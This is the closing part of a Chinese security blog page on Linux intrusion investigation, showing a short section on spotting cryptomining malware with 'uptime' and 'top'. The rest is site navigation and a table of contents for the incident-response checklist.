</code></pre><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/c8258f5f4fc95375dd7dd27e80f07e16_MD5.png"><h1 id="中毒案例"><a href="#中毒案例" class="headerlink" title="中毒案例"></a>中毒案例</h1><h2 id="挖矿病毒"><a href="#挖矿病毒" class="headerlink" title="挖矿病毒"></a>挖矿病毒</h2><h3 id="挖矿的种类"><a href="#挖矿的种类" class="headerlink" title="挖矿的种类"></a>挖矿的种类</h3><ol><li>CPU、GPU挖矿</li><li>显卡挖矿</li></ol><h3 id="查看是否被挖矿"><a href="#查看是否被挖矿" class="headerlink" title="查看是否被挖矿"></a>查看是否被挖矿</h3><p>确定执行命令是否比平时慢很多 &#x3D;&gt; 查看自己的进程或负载，判断其大小</p><ol><li><code>uptime</code> 查看最近一分钟的负载</li></ol><pre><code class="shell">[root@localhost liangc]# uptime
 16:02:18 up  3:53,  3 users,  load average: 0.00,        0.01,           0.05
                                         最近一分钟负载   最近五分钟负载   最近十五分钟负载
</code></pre><ol start="2"><li><code>top</code></li></ol><img data-src="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/image-20230705160500214.png" title="image-20230705160500214"><div class="tags"><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag"><i class="ic i-tag"></i> 应急响应</a> <a href="/tags/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" rel="tag"><i class="ic i-tag"></i> 入侵排查</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-12-27 09:44:00" itemprop="dateModified" datetime="2023-12-27T09:44:00+08:00">2023-12-27</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="余星酒 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="余星酒 支付宝"><p>支付宝</p></div><div><img data-src="/images/paypal.png" alt="余星酒 贝宝"><p>贝宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>余星酒 <i class="ic i-at"><em>@</em></i>余星酒</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" title="Linux入侵排查">http://example.com/PDCERF/入侵检查/Linux/Linux入侵排查/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/APT/web%E6%B8%97%E9%80%8F/web%E5%B8%B8%E8%A7%81%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclh3brzpj20zk0m8ann.jpg" title="web常见题目总结"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> 面试题</span><h3>web常见题目总结</h3></a></div><div class="item right"><a href="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/WebShell/WebShell%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclh0m9pdj20zk0m8hdt.jpg" title="WebShell入侵排查"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> 入侵排查</span><h3>WebShell入侵排查</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">用户分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">远程登录分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95"><span class="toc-number">3.</span> <span class="toc-text">历史记录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">进程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%88%86%E6%9E%90"><span class="toc-number">4.1.</span> <span class="toc-text">网络连接分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">进程文件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netstat-ps"><span class="toc-number">4.2.1.</span> <span class="toc-text">netstat+ps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lsof-ps"><span class="toc-number">4.2.2.</span> <span class="toc-text">lsof+ps</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF"><span class="toc-number">5.</span> <span class="toc-text">开机自启</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">6.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">7.</span> <span class="toc-text">系统日志</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">8.</span> <span class="toc-text">文件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tmp%E7%9B%AE%E5%BD%95"><span class="toc-number">8.1.</span> <span class="toc-text">tmp目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#etc-init-d-%E7%9B%AE%E5%BD%95"><span class="toc-number">8.2.</span> <span class="toc-text">&#x2F;etc&#x2F;init.d&#x2F;目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E4%BF%A1%E6%81%AF"><span class="toc-number">8.3.</span> <span class="toc-text">敏感文件信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">9.</span> <span class="toc-text">环境变量</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PATH%E5%8F%98%E9%87%8F%E5%BC%82%E5%B8%B8"><span class="toc-number">9.1.</span> <span class="toc-text">$PATH变量异常</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5"><span class="toc-number">10.</span> <span class="toc-text">后门排查</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RPM-Check%E6%A3%80%E6%9F%A5"><span class="toc-number">10.1.</span> <span class="toc-text">RPM Check检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rootkit%E6%9F%A5%E6%9D%80"><span class="toc-number">10.2.</span> <span class="toc-text">Rootkit查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LinuxCheck"><span class="toc-number">10.2.1.</span> <span class="toc-text">LinuxCheck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rkhunter"><span class="toc-number">10.2.2.</span> <span class="toc-text">rkhunter</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%AD%E6%AF%92%E6%A1%88%E4%BE%8B"><span class="toc-number">11.</span> <span class="toc-text">中毒案例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92"><span class="toc-number">11.1.</span> <span class="toc-text">挖矿病毒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF%E7%9A%84%E7%A7%8D%E7%B1%BB"><span class="toc-number">11.1.1.</span> <span class="toc-text">挖矿的种类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%98%AF%E5%90%A6%E8%A2%AB%E6%8C%96%E7%9F%BF"><span class="toc-number">11.1.2.</span> <span class="toc-text">查看是否被挖矿</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Linux/Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" rel="bookmark" title="Linux入侵排查">Linux入侵排查</a></li><li><a href="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/WebShell/WebShell%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" rel="bookmark" title="WebShell入侵排查">WebShell入侵排查</a></li><li><a href="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/Windows/Windows%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" rel="bookmark" title="Windows入侵排查">Windows入侵排查</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="余星酒" data-src="/images/avatar.jpg"><p class="name" itemprop="name">余星酒</p><div class="description" itemprop="description">欢迎参观我的笔记空间 ~ 这里主要会记录一些安全相关的学习笔记 🌸</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">253</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">43</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">36</span> <span class="name">标签</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/APT/web%E6%B8%97%E9%80%8F/web%E5%B8%B8%E8%A7%81%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/PDCERF/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%9F%A5/WebShell/WebShell%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/Other/011-%E5%8F%8D%E5%BC%B9shell/019-Powershell%E5%8F%8D%E5%BC%B9shell/" title="未命名">未命名</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/Other/011-%E5%8F%8D%E5%BC%B9shell/001-Awk%E5%8F%8D%E5%BC%B9shell/" title="未命名">未命名</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="分类于 代码审计">代码审计</a></div><span><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="5. java本地命令执行">5. java本地命令执行</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/APT/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/php-bypass/" title="未命名">未命名</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="分类于 深信服设备">深信服设备</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/AC/" title="分类于 AC">AC</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/AC/%E6%8E%A5%E5%85%A5%E8%AE%A4%E8%AF%81%E5%9F%BA%E7%A1%80/" title="接入认证基础">接入认证基础</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/System/" title="分类于 操作系统">操作系统</a> <i class="ic i-angle-right"></i> <a href="/categories/System/centos/" title="分类于 centos">centos</a></div><span><a href="/System/centos/iptables/" title="iptables">iptables</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="分类于 深信服设备">深信服设备</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/AC/" title="分类于 AC">AC</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/AC/%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB/" title="特征识别">特征识别</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="分类于 编程">编程</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="分类于 Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E9%A1%B9%E7%9B%AE/" title="分类于 项目">项目</a></div><span><a href="/Program/golang/%E9%A1%B9%E7%9B%AE/TCP%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E4%BB%A3%E7%90%86/" title="TCP扫描器和代理">TCP扫描器和代理</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="分类于 网络">网络</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="分类于 网络基础">网络基础</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E5%AE%9E%E9%AA%8C/" title="分类于 实验">实验</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/%E5%AE%9E%E9%AA%8C/%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88/" title="链路聚合">链路聚合</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="分类于 编程">编程</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="分类于 Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E8%BF%9B%E9%98%B6/" title="分类于 进阶">进阶</a></div><span><a href="/Program/golang/%E8%BF%9B%E9%98%B6/%E5%B9%B6%E5%8F%91/" title="并发">并发</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">余星酒 @ 余星酒</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"PDCERF/入侵检查/Linux/Linux入侵排查/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->